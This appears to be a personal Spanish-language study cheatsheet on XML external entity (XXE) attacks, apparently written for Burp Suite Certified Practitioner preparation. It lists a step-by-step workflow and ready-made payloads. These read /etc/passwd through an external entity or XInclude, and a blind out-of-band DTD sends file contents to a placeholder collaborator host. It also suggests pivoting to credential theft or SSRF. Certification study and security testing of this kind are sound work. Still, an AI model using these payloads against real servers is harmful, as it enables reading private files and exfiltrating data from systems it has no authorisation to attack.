---
tipo: cheatsheet
vuln: xxe
tags: [bscp, tipo/cheatsheet, vuln/xxe]
relacionada: "[[XXE]]"
---

# CS · XXE

## Flujo repetible
1. Detecta entrada XML (body, SOAP, subida SVG/DOCX).
2. Prueba entidad externa para leer fichero.
3. Si es ciego, usa DTD externa en {{EXPLOIT}} y exfiltra a {{COLLAB}}.

## Detección
```xml
<!-- Sonda: define una entidad y observa si se resuelve en la respuesta -->
<!DOCTYPE foo [<!ENTITY test "INYECTABLE">]>
<x>&test;</x>
```

## Plantillas de payload
```xml
<!-- Lectura de fichero -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<x>&xxe;</x>
```
```xml
<!-- Blind OOB (dispara la DTD) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{{EXPLOIT}}/x.dtd"> %xxe;]>
```
```xml
<!-- DTD alojada en {{EXPLOIT}} para exfiltrar -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; ex SYSTEM 'http://{{COLLAB}}/?x=%file;'>">
%eval; %ex;
```
```xml
<!-- XInclude si no controlas el DOCTYPE -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Escalada al objetivo
Leer credenciales/ficheros → o SSRF vía XXE a interno.

## Checklist
- [ ] Probé entidad SYSTEM file://
- [ ] Probé OOB con DTD en {{EXPLOIT}}
- [ ] Probé vía subida (SVG/DOCX)

## Referencias
- https://portswigger.net/web-security/xxe
